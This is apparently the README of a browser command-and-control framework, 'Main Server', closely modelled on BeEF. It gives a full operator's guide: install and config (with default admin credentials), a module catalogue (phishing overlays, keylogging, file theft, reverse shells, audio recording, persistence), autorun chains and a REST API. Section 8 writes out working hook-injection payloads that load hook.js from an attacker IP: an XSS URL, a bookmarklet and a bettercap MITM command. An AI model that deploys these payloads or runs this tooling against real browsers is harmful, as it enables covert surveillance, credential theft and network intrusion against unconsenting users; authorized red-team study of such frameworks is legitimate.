# Main Server — Browser Exploitation Framework

> **LEGAL NOTICE**
> This tool is intended exclusively for authorized penetration testing, security research, CTF competitions, and educational use. Running this against systems or browsers without explicit written authorization is illegal under the Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and equivalent legislation worldwide. The authors and contributors accept no liability for misuse.

---

## Table of Contents

1. [What This Is](#1-what-this-is)
2. [How It Works](#2-how-it-works)
3. [System Requirements](#3-system-requirements)
4. [Installation](#4-installation)
5. [Starting and Stopping](#5-starting-and-stopping)
6. [Configuration](#6-configuration)
7. [The Admin Panel](#7-the-admin-panel)
8. [Hooking a Browser](#8-hooking-a-browser)
9. [Modules — What This Can Do](#9-modules--what-this-can-do)
10. [Extensions](#10-extensions)
11. [Autorun Engine](#11-autorun-engine)
12. [REST API](#12-rest-api)
13. [Advanced Usage](#13-advanced-usage)
14. [File Structure](#14-file-structure)

---

## 1. What This Is

**Main Server** is a browser-side command-and-control (C2) framework. Once a target browser loads a small JavaScript snippet (the hook), the browser becomes a persistent agent — called a **hooked browser** — that you can remotely control through a web-based admin panel or a REST API.

Unlike traditional C2 frameworks that run binaries on an operating system, this framework runs entirely inside the browser using JavaScript. This means:

- No software needs to be installed on the target machine
- It works on any OS — Windows, macOS, Linux, Android, iOS
- It bypasses host-based security tools like antivirus and EDR
- Everything the browser can do, the framework can do — access cookies, the DOM, the local network, the clipboard, the camera (with permission), the microphone, geolocation, and more

The framework was originally designed for authorized web penetration testing, red team assessments, and browser security research.

---

## 2. How It Works

```
┌─────────────────────────────────────────────────────────────┐
│  ATTACKER MACHINE                                            │
│                                                              │
│   ┌──────────────┐          ┌─────────────────────────────┐ │
│   │  Admin Panel │◄────────►│  Main Server (port 3000)    │ │
│   │  /ui/panel   │          │                             │ │
│   └──────────────┘          │  - Serves hook.js           │ │
│                             │  - Manages hooked browsers  │ │
│   ┌──────────────┐          │  - Queues commands          │ │
│   │  REST API    │◄────────►│  - Stores results           │ │
│   │  /api/...    │          │  - Runs autorun rules       │ │
│   └──────────────┘          └──────────┬────────────────┘  │
└──────────────────────────────────────┬─┘                    │
                                       │ HTTP/WebSocket        │
                              ┌────────▼──────────┐           │
                              │  TARGET BROWSER   │           │
                              │                   │           │
                              │  hook.js runs     │           │
                              │  Polls every 1s   │           │
                              │  Executes modules │           │
                              │  Sends results    │           │
                              └───────────────────┘           │
```

**The flow in 4 steps:**

1. **Hook injection** — A `<script src="http://YOUR_IP:3000/hook.js"></script>` tag is placed on a web page the target visits. This can be via an XSS vulnerability, a cloned phishing page, a social engineering lure, or a Wi-Fi MITM attack.

2. **Browser hooks in** — When the browser loads the page, `hook.js` silently establishes a persistent connection back to the server using XHR polling (every 1 second by default) or WebSockets. The browser appears in the admin panel within seconds.

3. **Operator sends commands** — Through the admin panel or REST API, the operator selects a module and executes it against one or more hooked browsers.

4. **Results return** — The module's JavaScript code runs in the browser, collects the requested data or performs the action, and sends the result back to the server where it is stored and displayed.

The hook stays alive as long as the browser tab is open. Persistence modules can extend this further.

---

## 3. System Requirements

| Component | Requirement |
|-----------|-------------|
| OS | Linux or macOS (Windows not supported) |
| Ruby | 3.0 or newer (tested on 3.2.x) |
| SQLite | 3.x |
| Node.js | 10 or newer (for JS documentation only) |
| RAM | 512 MB minimum, 1 GB recommended |
| Disk | ~150 MB (including gems) |

---

## 4. Installation

Dependencies are already installed and bundled locally in `vendor/bundle`. No system-wide gem installation is required.

If you move the project to a new machine:

```bash
# 1. Install system packages
sudo apt-get install ruby3.2-dev libsqlite3-dev

# 2. Install bundler in user space
gem install bundler --user-install

# 3. Install gems locally
bundle config set --local path 'vendor/bundle'
bundle install
```

---

## 5. Starting and Stopping

From the project directory:

```bash
# Start the server (runs in background)
./start

# Stop the server
./stop

# Watch live logs
tail -f /tmp/server.log
```

The server starts on `http://0.0.0.0:3000` by default — accessible from all network interfaces.

To run it in the foreground (see all output live):

```bash
bundle exec ruby server
```

---

## 6. Configuration

All settings live in `config.yaml`. Key sections:

### Credentials

```yaml
credentials:
    user:   "server"
    passwd: "server1337"   # Change this before deploying
```

### Network

```yaml
http:
    host: "0.0.0.0"     # Listen on all interfaces. Set to specific IP to restrict
    port: "3000"

    # If running behind a reverse proxy or on a VPS with a public domain:
    # public:
    #     host: "yourdomain.com"
    #     port: "443"
    #     https: false
```

### Restricting Who Can Hook / Who Can Access the UI

```yaml
restrictions:
    # Which IPs are allowed to be hooked (default: everyone)
    permitted_hooking_subnet: ["0.0.0.0/0", "::/0"]

    # Which IPs can access the admin panel (lock this down in production)
    permitted_ui_subnet: ["127.0.0.1/32", "::1/128"]

    # Block specific subnets from being hooked (e.g. your own network)
    excluded_hooking_subnet: ["127.0.0.1/32"]
```

### WebSocket Mode (Faster Than XHR Polling)

```yaml
websocket:
    enable: true           # Switch from XHR polling to WebSockets
    port: 61985
    secure: false
    ws_poll_timeout: 1000  # How often the browser checks for commands (ms)
```

### HTTPS

```yaml
https:
    enable: true
    key:  "server_key.pem"
    cert: "server_cert.pem"
```

Generate a self-signed cert:
```bash
openssl req -x509 -newkey rsa:4096 -keyout server_key.pem -out server_cert.pem -days 365 -nodes
```

### Web Server Imitation

Makes the server masquerade as a common web server to blend in:

```yaml
web_server_imitation:
    enable: true
    type:   "apache"   # apache | iis | nginx
    hook_404: false    # Inject hook into every 404 response
    hook_root: false   # Inject hook into the server root page
```

### Database

```yaml
database:
    file: "server.db"   # SQLite file — all sessions, commands, and results stored here
```

### GeoIP (Optional)

```yaml
geoip:
    enable: true
    database: '/usr/share/GeoIP/GeoLite2-City.mmdb'
```

Install: `sudo apt-get install libmaxminddb-dev` and download the GeoLite2 City database from MaxMind.

### Enabling / Disabling Extensions

```yaml
extension:
    admin_ui:          { enable: true  }
    proxy:             { enable: true  }
    network:           { enable: true  }
    xssrays:           { enable: true  }
    metasploit:        { enable: false }   # Requires Metasploit running
    evasion:           { enable: false }
    social_engineering:{ enable: false }
    notifications:     { enable: false }
```

---

## 7. The Admin Panel

Access at: `http://YOUR_IP:3000/ui/panel`
Login with the credentials set in `config.yaml`.

### Layout

```
┌─────────────────────┬────────────────────────────────────────┐
│  HOOKED BROWSERS    │  MAIN CONTENT AREA                     │
│                     │                                        │
│  Online             │  [ Welcome | Logs | Zombies | AutoRun ]│
│  └─ 192.168.1.5     │                                        │
│     Firefox/Linux   │  When a browser is selected:          │
│  └─ 10.0.0.12       │  [ Commands | Details | Logs |         │
│     Chrome/Win10    │    Network | Proxy | XssRays | RTC ]   │
│                     │                                        │
│  Offline            │                                        │
│  └─ (past sessions) │                                        │
└─────────────────────┴────────────────────────────────────────┘
```

### Tabs per Hooked Browser

| Tab | What It Shows |
|-----|---------------|
| **Commands** | Execute modules. Browse by category, select a module, fill options, execute. Results appear in the results pane. |
| **Details** | Everything collected about the browser: OS, version, platform, installed plugins, technologies detected, cookies, screen size, timezone, language, and more. |
| **Logs** | All events for this browser — when it hooked in, what modules were run, what the results were. |
| **Network** | Visual network graph of the LAN around the hooked browser. Shows subnets, discovered hosts, services, open ports. Right-click any host to run targeted scans. |
| **Proxy** | Use the hooked browser as an HTTP proxy. Route your traffic through the victim's browser, making requests appear to originate from their machine on their network. |
| **XssRays** | Scan all links and forms on the hooked page for reflected XSS vulnerabilities automatically. |
| **RTC** | WebRTC peer information — real internal IP address even behind NAT. |

### Right-Click Context Menu (Hooked Browser Tree)

Right-clicking a browser in the left panel gives:
- **Use as Proxy** — Set this browser as the HTTP tunneling proxy
- **Run XssRays** — Start XSS scan on current page
- **Open WebRTC** — Get real IP via WebRTC
- **Delete** — Remove browser session from database

---

## 8. Hooking a Browser

### Method 1 — Direct Script Tag

Embed in any HTML page you control:

```html
<script src="http://YOUR_SERVER_IP:3000/hook.js"></script>
```

### Method 2 — XSS Injection

If you discover a reflected or stored XSS vulnerability:

```
http://target.com/search?q=<script src="http://YOUR_IP:3000/hook.js"></script>
```

### Method 3 — Phishing Page (Social Engineering Extension)

The social engineering extension includes a web cloner that copies a legitimate site and automatically injects the hook. Enable it in `config.yaml` and configure under `extensions.social_engineering`.

### Method 4 — Wi-Fi MITM

On a network you control (e.g. a rogue access point), use a tool like `bettercap` to inject the hook script into HTTP responses:

```
bettercap -eval "set http.proxy.script hook_inject.js; http.proxy on"
```

### Method 5 — Browser Bookmarklet

Drag this link to the browser bookmarks bar, then click it on any page:

```
javascript:(function(){var s=document.createElement('script');s.src='http://YOUR_IP:3000/hook.js';document.body.appendChild(s);})();
```

### Demo Pages (Testing Only)

The server includes local demo pages for testing hooks without a target:

- `http://YOUR_IP:3000/demos/basic.html` — Basic hook demo
- `http://YOUR_IP:3000/demos/butcher/index.html` — Advanced demo

---

## 9. Modules — What This Can Do

The framework ships with **206 modules** across 12 categories. Each module is JavaScript code that runs inside the hooked browser and sends results back.

---

### Browser Fingerprinting

Identify exactly what the target is running without them knowing.

| Module | What It Does |
|--------|-------------|
| `browser_fingerprinting` | Detect browser name, version, engine using protocol handlers |
| `detect_extensions` | List installed browser extensions (Chrome/Firefox) |
| `detect_activex` | Check for ActiveX controls (IE/Edge legacy) |
| `detect_mime_types` | Enumerate all registered MIME types in the browser |
| `detect_popup_blocker` | Check if popup blocker is active |
| `detect_lastpass` | Detect LastPass password manager |
| `detect_evernote_clipper` | Detect Evernote extension |
| `detect_firebug` | Detect Firebug developer tool |
| `detect_wmp` | Windows Media Player detection |
| `detect_quicktime` | QuickTime plugin detection |
| `detect_silverlight` | Microsoft Silverlight detection |
| `detect_unity` | Unity Web Player detection |
| `detect_office` | Microsoft Office detection |
| `detect_vlc` | VLC Media Player detection |
| `detect_toolbars` | Browser toolbar detection (Google, Alexa, etc.) |
| `avant_steal_history` | Steal browser history (Avant Browser) |

---

### Host Enumeration

Gather information about the machine behind the browser.

| Module | What It Does |
|--------|-------------|
| `get_system_info_java` | OS name, version, architecture via Java |
| `get_battery_status` | Battery level, charging state, time remaining |
| `get_internal_ip_webrtc` | Real internal IP address via WebRTC STUN leak |
| `get_internal_ip_java` | Real internal IP via Java applet |
| `get_wireless_keys` | Attempt to read saved Wi-Fi credentials |
| `get_connection_type` | Detect connection type (WiFi, ethernet, cellular) |
| `get_registry_keys` | Read Windows registry keys via ActiveX |
| `detect_antivirus` | Detect installed antivirus software |
| `detect_software` | Enumerate installed software |
| `detect_users` | List local system users |
| `detect_local_drives` | Enumerate local disk drives |
| `detect_default_browser` | Identify the system's default browser |
| `hook_default_browser` | Hook into the default browser |
| `detect_airdroid` | Detect AirDroid (Android remote access) |
| `detect_cups` | CUPS printer service detection |
| `detect_protocol_handlers` | Enumerate registered URI protocol handlers |

---

### Network Reconnaissance

Discover and map the target's local network from inside their browser.

| Module | What It Does |
|--------|-------------|
| `ping_sweep` | ICMP-style ping sweep of a subnet to find live hosts |
| `jslanscanner` | Full LAN host discovery using JavaScript |
| `fetch_port_scanner` | Scan TCP ports on discovered hosts |
| `dns_enumeration` | Enumerate DNS records for a domain |
| `identify_lan_subnets` | Identify all subnets the victim is connected to |
| `internal_network_fingerprinting` | Fingerprint internal network services |
| `get_http_servers` | Find web servers on the local network |
| `cross_origin_scanner_cors` | Identify CORS misconfigurations on internal services |
| `cross_origin_scanner_flash` | CORS scanning via Flash (legacy) |
| `detect_tor` | Detect if target is using Tor |
| `detect_burp` | Detect Burp Suite proxy |
| `detect_proxy_servers_wpad` | Detect proxy configuration via WPAD |
| `detect_soc_nets` | Detect social network sessions (logged-in cookies) |
| `nat_pinning_irc` | NAT pinning attack via IRC |
| `dns_rebinding` | DNS rebinding to access internal resources |
| `DOSer` | Denial-of-service via browser resource exhaustion |

---

### Social Engineering

Trick the target into giving up credentials or executing actions.

| Module | What It Does |
|--------|-------------|
| `fake_flash_update` | Display convincing fake Flash Player update dialog |
| `fake_notification` | Generic fake browser notification |
| `fake_notification_ff` | Firefox-styled fake security notification |
| `fake_notification_c` | Chrome-styled fake security notification |
| `fake_notification_ie` | Internet Explorer-styled fake alert |
| `pretty_theft` | Polished credential theft dialog (Facebook/generic style) |
| `fake_lastpass` | Fake LastPass master password prompt |
| `gmail_phishing` | Realistic Gmail credential phishing overlay |
| `fake_evernote_clipper` | Fake Evernote login prompt |
| `simple_hijacker` | Redirect browser to arbitrary URL |
| `clickjacking` | Invisible iframe clickjacking attack |
| `clippy` | Microsoft Clippy-style social engineering popup |
| `replace_video_fake_plugin` | Replace video with fake plugin install prompt |
| `hta_powershell` | Windows HTA file delivery with PowerShell |
| `firefox_extension_dropper` | Drop malicious Firefox extension |
| `firefox_extension_bindshell` | Firefox extension that opens a bind shell |
| `firefox_extension_reverse_shell` | Firefox extension reverse shell |
| `edge_wscript_wsh_injection` | WSH/WScript injection via Edge |

---

### Persistence

Keep the hook alive and maintain access.

| Module | What It Does |
|--------|-------------|
| `confirm_close_tab` | Pop a confirmation dialog when user tries to close the tab — keeps them on the page |
| `popunder_window` | Open an invisible popunder window to maintain access after tab close |
| `popunder_window_ie` | IE-specific popunder technique |
| `man_in_the_browser` | Full MitB attack — intercept and modify all form submissions silently |
| `jsonp_service_worker` | Register a Service Worker for long-term browser persistence |
| `iframe_above` | Float an invisible iframe above the page |
| `hijack_opener` | Hijack the `window.opener` reference |

---

### Exploits

Targeting specific server-side software the target can reach (useful for internal network pivoting).

| Target | Modules |
|--------|---------|
| **Apache** | `apache_felix_remote_shell`, `apache_cookie_disclosure` |
| **JBoss** | `jboss_jmx_upload_exploit` |
| **ColdFusion** | `coldfusion_dir_traversal_exploit` |
| **Jenkins** | `jenkins_groovy_code_exec` |
| **Kemp LM** | `kemp_command_execution` |
| **GlassFish** | `glassfish_war_upload_xsrf` |
| **pfSense** | `pfsense` firewall exploitation |
| **OpenCart** | `opencart_reset_password` |
| **HP uCMDB** | `hp_ucmdb_add_user_csrf` |
| **Generic** | 30+ additional web application exploits |

---

### PhoneGap / Cordova (Mobile Apps)

For targets using a mobile app built with PhoneGap/Cordova.

| Module | What It Does |
|--------|-------------|
| `phonegap_detect` | Confirm app is running in PhoneGap |
| `phonegap_geo_locate` | Get GPS coordinates |
| `phonegap_list_contacts` | Dump device contact list |
| `phonegap_list_files` | Enumerate device filesystem |
| `phonegap_file_upload` | Exfiltrate files from device |
| `phonegap_start_record_audio` | Begin recording audio via microphone |
| `phonegap_stop_record_audio` | Stop recording and retrieve audio |
| `phonegap_keychain` | Access iOS Keychain stored credentials |
| `phonegap_check_connection` | Network connectivity information |

---

### Miscellaneous

| Module | What It Does |
|--------|-------------|
| `raw_javascript` | Execute arbitrary JavaScript directly in the browser |
| `iframe_keylogger` | Log all keystrokes on the current page |
| `local_file_theft` | Read and exfiltrate local files accessible to the browser |
| `track_physical_movement` | Track physical device movement via accelerometer |
| `invisible_iframe` | Inject an invisible iframe |
| `read_gmail` | Extract visible Gmail content |
| `blockui` | Block the user interface — freeze the page |
| `nosleep` | Prevent the device from sleeping |

---

### Inter-Protocol Exploitation (IPEC)

Use the browser as a bridge to attack non-HTTP services on the internal network.

| Module | What It Does |
|--------|-------------|
| `inter_protocol_irc` | Send commands to an IRC server on the internal network |
| `inter_protocol_imap` | Interact with an IMAP mail server |
| `inter_protocol_posix_bindshell` | Open a bind shell on a Linux target |
| `inter_protocol_win_bindshell` | Open a bind shell on a Windows target |
| `inter_protocol_redis` | Interact with a Redis instance |
| `cross_site_printing` | Force silent print jobs via CSS |
| `dns_tunnel` | Covert DNS tunneling channel |
| `s2c_dns_tunnel` | Server-to-client DNS tunnel |

---

## 10. Extensions

Extensions add capabilities to the server itself beyond module execution.

### Proxy Extension

Turns any hooked browser into a full HTTP proxy. Configure your browser or tool to use `127.0.0.1:6789` as an HTTP proxy and all traffic will be routed through the hooked browser — appearing to originate from the victim's machine on their network.

- Default address: `127.0.0.1`
- Default port: `6789`
- Supports HTTPS tunneling
- All requests logged in the Proxy tab's History panel

### Network Extension

Provides the visual network graph in the Network tab. Discovers:
- Live hosts on the local subnet
- Open TCP ports per host
- Service identification
- Subnet structure

Discovered hosts appear in the vis.js network graph with icons indicating device type (PC, router, phone, etc.). Right-click any node for targeted exploit options.

### XssRays Extension

Automatically scans all links and form actions on the currently hooked page for reflected XSS vulnerabilities. Fires test payloads and monitors for execution. Results shown in the XssRays tab. Configurable payload timeout (default 3000ms).

### Evasion Extension

Applies JavaScript obfuscation to the hook payload before serving it to the browser. Techniques applied in order:

1. **Minify** — Remove whitespace and comments
2. **Base64** — Encode strings
3. **Whitespace** — Whitespace-based obfuscation

Enables in `config.yaml`:
```yaml
extension:
    evasion:
        enable: true
```

### Metasploit Integration

Connects to a running Metasploit RPC server to launch Metasploit modules directly from the admin panel. Requires Metasploit running with:

```
msf6> load msgrpc Pass=password
```

Then configure in `config.yaml`:
```yaml
extension:
    metasploit:
        enable: true
        host: "127.0.0.1"
        port: 55552
        user: "msf"
        pass: "password"
        ssl: false
```

### WebRTC Extension

Extracts the real internal IP address of the hooked browser using WebRTC's STUN mechanism — even when the browser is behind a NAT or VPN. Shown in the RTC tab. Configurable STUN/TURN servers.

### Notifications Extension

Sends alerts when a new browser hooks in. Supports:
- **Email** — via SMTP
- **Slack** — via webhook URL
- **Pushover** — for mobile push notifications
- **ntfy** — open-source push notifications

Configure in `config.yaml` under `extension.notifications`.

### DNS Rebinding Extension

Facilitates DNS rebinding attacks to bypass the Same Origin Policy and access internal HTTP services that are normally unreachable from the internet.

### Social Engineering Extension

Web cloning tool that creates a copy of a target website with the hook automatically injected. Configured target URL is fetched via wget and served locally.

---

## 11. Autorun Engine

The Autorun Engine (ARE) automatically executes a chain of modules against every browser that hooks in — without manual intervention. Rules are stored as JSON files in the `arerules/` directory.

### Rule Structure

```json
{
  "name": "Rule Name",
  "author": "operator",
  "browser": "FF",
  "modules": [
    {
      "name": "get_internal_ip_webrtc",
      "condition": null,
      "options": {}
    },
    {
      "name": "ping_sweep",
      "condition": "status==1",
      "code": "var target = get_internal_ip_webrtc_mod_output.split('.').slice(0,3).join('.')+'.0/24';",
      "options": {
        "ipRange": "<<mod_input>>"
      }
    }
  ],
  "execution_order": [0, 1],
  "execution_delay": [0, 500],
  "chain_mode": "nested-forward"
}
```

### Fields Explained

| Field | Description |
|-------|-------------|
| `name` | Display name in the admin panel |
| `author` | Author identifier |
| `browser` | Filter: `FF` (Firefox), `C` (Chrome), `IE`, `S` (Safari), or `all` |
| `modules` | Array of module execution steps |
| `modules[].name` | Module name to execute |
| `modules[].condition` | JavaScript expression that must be true to execute this step. `status==1` means previous step succeeded. `null` means always run. |
| `modules[].code` | JavaScript code to process previous module output before using it in this step |
| `modules[].options` | Module parameters. Use `<<mod_input>>` to inject output from `code` |
| `execution_order` | Order to run modules (array of indices) |
| `execution_delay` | Millisecond delay before each module in execution_order |
| `chain_mode` | `sequential` = fire and forget, `nested-forward` = wait for result before next step |

### Chain Modes

- **`sequential`** — Fires all modules one after another without waiting. Fastest but no conditional logic.
- **`nested-forward`** — Waits for each module to return a result before proceeding. Enables conditional branching. Polls every 300ms (configurable). Times out after 5000ms.

### Accessing Previous Module Output

In `code` and `options`, previous module results are available as:

```
<module_name>_mod_output
```

For example, after `get_internal_ip_webrtc` runs, its output is in:
```javascript
get_internal_ip_webrtc_mod_output  // e.g. "192.168.1.45"
```

### Managing Rules

Via the admin panel: **AutoRun tab** → Create / Edit / Delete / Execute rules.

Via REST API:
```bash
# List rules
curl "http://localhost:3000/api/autorun_engine/rules?token=TOKEN"

# Run a rule on all online browsers
curl "http://localhost:3000/api/autorun_engine/run/RULE_ID?token=TOKEN"
```

### Included Example Rules

| Rule File | What It Does |
|-----------|-------------|
| `get_cookie.json` | Collect all cookies from the hooked page |
| `lan_ping_sweep.json` | Get internal IP, then sweep the whole subnet |
| `lan_fingerprint.json` | Fingerprint all discovered LAN services |
| `lan_port_scan.json` | Port scan all discovered hosts |
| `man_in_the_browser.json` | Enable MitB on all form submissions |
| `record_snapshots.json` | Periodically take screenshots |
| `win_fake_malware.json` | Show fake malware alert on Windows targets |
| `raw_javascript.json` | Execute arbitrary JS on every new hook |
| `alert.json` | Simple alert popup (testing/demo) |
| `ie_win_htapowershell.json` | Deliver HTA/PowerShell payload on IE/Windows |
| `ff_osx_extension-dropper.json` | Drop Firefox extension on macOS/Firefox |
| `c_osx_test-return-mods.json` | Test module execution on Chrome/macOS |

---

## 12. REST API

All API requests require a token obtained from the login endpoint.

**Base URL:** `http://YOUR_IP:3000/api`

### Authentication

```http
POST /api/admin/login
Content-Type: application/json

{"username": "server", "password": "server1337"}
```

Response:
```json
{"success": true, "token": "abc123..."}
```

All subsequent requests: append `?token=abc123...` to the URL.

---

### Hooked Browsers

```http
# All online browsers
GET /api/hooked_browsers?token=TOKEN

# All browsers (online + offline)
GET /api/hooked_browsers/all?token=TOKEN

# Specific browser full details
GET /api/hooked_browsers/:session?token=TOKEN

# Delete a browser session
GET /api/hooked_browsers/:session/delete?token=TOKEN
```

---

### Modules

```http
# List all 206 modules
GET /api/modules?token=TOKEN

# Get module info (options, description)
GET /api/modules/:mod_id?token=TOKEN

# Execute a module on one browser
POST /api/modules/:session/:mod_id?token=TOKEN
Content-Type: application/json
{"param1": "value1"}

# Get result of an executed module
GET /api/modules/:session/:mod_id/:cmd_id?token=TOKEN

# Execute on multiple browsers at once
POST /api/modules/multi_browser?token=TOKEN
Content-Type: application/json
{
  "mod_id": 42,
  "mod_params": {"param": "value"},
  "hb_ids": ["ALL_ONLINE"]
}

# Execute multiple modules on one browser
POST /api/modules/multi_module?token=TOKEN
Content-Type: application/json
{
  "hb": "SESSION_ID",
  "modules": [
    {"mod_id": 1, "mod_input": [{"name": "p", "value": "v"}]},
    {"mod_id": 2, "mod_input": []}
  ]
}
```

---

### Logs

```http
# All logs
GET /api/logs?token=TOKEN

# Logs for specific browser
GET /api/logs/:session?token=TOKEN

# RSS feed
GET /api/logs/rss?token=TOKEN
```

---

### Server Management

```http
# Mount a file for delivery
POST /api/server/bind?token=TOKEN
Content-Type: application/json
{"mount": "/payload.exe", "local_file": "payload.exe"}

# List mounted files
GET /api/server/mounts?token=TOKEN

# Framework version
GET /api/server/version?token=TOKEN
```

---

### Autorun Engine

```http
# List all rules
GET /api/autorun_engine/rules?token=TOKEN

# Get specific rule
GET /api/autorun_engine/rule/:rule_id?token=TOKEN

# Create rule
POST /api/autorun_engine/rule/add?token=TOKEN
Content-Type: application/json
{ ...rule JSON... }

# Update rule
PATCH /api/autorun_engine/rule/:rule_id?token=TOKEN

# Delete rule
DELETE /api/autorun_engine/rule/:rule_id?token=TOKEN

# Execute rule on all online browsers
GET /api/autorun_engine/run/:rule_id?token=TOKEN

# Execute rule on specific browser
GET /api/autorun_engine/run/:rule_id/:hb_id?token=TOKEN
```

---

## 13. Advanced Usage

### Running on a Remote VPS

If the server is on a VPS with a public IP, set the public host so the hook URL is correct:

```yaml
# config.yaml
http:
    host: "0.0.0.0"
    port: "3000"
    public:
        host: "1.2.3.4"      # Your VPS public IP or domain
        port: "3000"
        https: false
```

Lock down the admin UI to your IP only:
```yaml
restrictions:
    permitted_ui_subnet: ["YOUR_HOME_IP/32"]
```

### Running Behind a Reverse Proxy (Nginx)

```nginx
server {
    listen 443 ssl;
    server_name yourdomain.com;

    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

Then in `config.yaml`:
```yaml
http:
    allow_reverse_proxy: true
    public:
        host: "yourdomain.com"
        port: "443"
        https: true
```

### Automating with the REST API

Example: Hook a browser, get its internal IP, sweep the subnet:

```bash
# 1. Get token
TOKEN=$(curl -s -X POST http://localhost:3000/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username":"server","password":"server1337"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 2. List hooked browsers
curl "http://localhost:3000/api/hooked_browsers?token=$TOKEN"

# 3. Execute get_internal_ip_webrtc on a browser (mod_id varies)
curl -X POST "http://localhost:3000/api/modules/SESSION_ID/MOD_ID?token=$TOKEN" \
  -H "Content-Type: application/json" -d '{}'

# 4. Get the result
curl "http://localhost:3000/api/modules/SESSION_ID/MOD_ID/CMD_ID?token=$TOKEN"
```

### Enabling WebSockets for Better Performance

For more responsive control (especially useful for chained autorun rules):

```yaml
http:
    websocket:
        enable: true
        port: 61985
        ws_poll_timeout: 500
```

The browser will switch from 1-second XHR polling to a persistent WebSocket connection — command delivery goes from ~1 second latency to near-instant.

---

## 14. File Structure

```
main-server/
├── server                  ← Main executable (run this)
├── start                   ← Start in background
├── stop                    ← Stop server
├── config.yaml             ← All configuration
├── server.db               ← SQLite database (sessions, results, logs)
├── server_cert.pem         ← SSL certificate
├── server_key.pem          ← SSL private key
├── VERSION                 ← Framework version
│
├── core/                   ← Framework engine
│   ├── main/
│   │   ├── client/         ← JavaScript hook (server.js, browser.js, net.js, ...)
│   │   ├── handlers/       ← HTTP request handlers
│   │   ├── models/         ← Database models
│   │   ├── rest/           ← REST API implementation
│   │   ├── console/        ← Startup banner and CLI
│   │   └── configuration.rb← Config loader
│   ├── api.rb              ← Plugin/hook registration API
│   └── loader.rb           ← Gem and dependency loader
│
├── modules/                ← 206 attack/recon modules
│   ├── browser/            ← Browser fingerprinting (31 modules)
│   ├── host/               ← System enumeration (25 modules)
│   ├── network/            ← Network scanning (23 modules)
│   ├── social_engineering/ ← User manipulation (24 modules)
│   ├── exploits/           ← Server exploits (40 modules)
│   ├── persistence/        ← Stay alive techniques (8 modules)
│   ├── phonegap/           ← Mobile exploitation (16 modules)
│   ├── misc/               ← Miscellaneous (13 modules)
│   ├── ipec/               ← Inter-protocol attacks (10 modules)
│   ├── chrome_extensions/  ← Chrome-specific (6 modules)
│   ├── metasploit/         ← Metasploit bridge (1 module)
│   └── debug/              ← Testing modules (9 modules)
│
├── extensions/             ← Framework extensions
│   ├── admin_ui/           ← Web-based control panel
│   │   ├── controllers/    ← Login and panel HTML templates
│   │   └── media/
│   │       ├── css/        ← Stylesheets (dark-theme.css here)
│   │       ├── javascript/ ← All UI JavaScript
│   │       └── images/     ← Icons and images
│   ├── proxy/              ← HTTP tunneling proxy
│   ├── network/            ← LAN discovery
│   ├── xssrays/            ← XSS scanner
│   ├── evasion/            ← Hook obfuscation
│   ├── metasploit/         ← Metasploit integration
│   ├── social_engineering/ ← Web cloner
│   ├── webrtc/             ← WebRTC IP extraction
│   ├── notifications/      ← Email/Slack/Pushover alerts
│   ├── dns_rebinding/      ← DNS rebinding attacks
│   └── events/             ← Event logging
│
├── arerules/               ← 25 Autorun Engine rule examples
└── vendor/bundle/          ← All Ruby gems (self-contained, no system install needed)
```

---

*Framework version 0.6.0.0 — for authorized use only.*
